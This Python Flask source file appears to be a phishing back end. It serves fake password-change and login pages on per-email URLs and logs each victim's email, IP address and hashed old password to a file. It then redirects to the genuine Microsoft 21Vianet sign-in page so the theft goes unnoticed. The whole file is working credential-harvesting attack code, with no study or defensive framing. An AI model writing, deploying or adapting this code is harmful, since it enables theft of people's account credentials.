#encoding=utf-8
import hashlib
from flask import Flask, redirect, request,render_template
import logging
from flask import session

M = hashlib.md5()
logging.basicConfig(level= logging.ERROR,#控制台打印的日志级别
                    filename='./logs/new.log',
                    filemode='a',##模式，有w和a，w就是写模式，每次都会重新写日志，覆盖之前的日志
                    #a是追加模式，默认如果不写的话，就是追加模式
                    format=
                    '%(asctime)s - %(levelname)s: %(message)s'
                    #日志格式
                    )

app = Flask(__name__,template_folder="./templates")
app.secret_key = "123456"

# 自定义装饰器
from werkzeug.routing import BaseConverter
class MobelConverter(BaseConverter):
    """"""
    def __init__(self, url_map):
        # 调用父类的初始化方法
        super().__init__(url_map)
        # 将正则表达式的参数保存到对象属性中，flask会去使用这个属性来进行路由的正则匹配
        self.regex = r'\w+([-+.]\w+)*@\w+([-.]\w+)*\.\w+([-.]\w+)*'
# 将自定义转换器添加到flask应用中
app.url_map.converters['email'] = MobelConverter




@app.route("/changepwd/<email:email>")
def changpwd(email):
    session['email'] = email
    logging.error("url->changepwd:["+request.remote_addr+"]"+email)
    return render_template("./chpwd.html",new_email=email)

@app.route("/changepwd_email",methods=['post','get'])
def changpwd_email():
    email = session.get("email")
    old_pwd = request.args.get("OldPasswordTextBox")
    M.update(old_pwd.encode('utf-8'))
    logging.error("GET password:["+request.remote_addr+"]"+email+"->"+M.hexdigest())

    return redirect("https://login.partner.microsoftonline.cn/")

@app.route("/login/<email:email>")
def login(email):
    session['email'] = email
    logging.error("url->login:["+request.remote_addr+"]"+email)
    return render_template("./login.html")

@app.route("/login_email",methods=['get','post'])
def login_email():
    email = request.args.get("email")
    logging.error("GET email:["+request.remote_addr+"]"+email)

    return redirect("https://login.partner.microsoftonline.cn/")

if __name__ == '__main__':
    app.run(host='0.0.0.0',port=80)
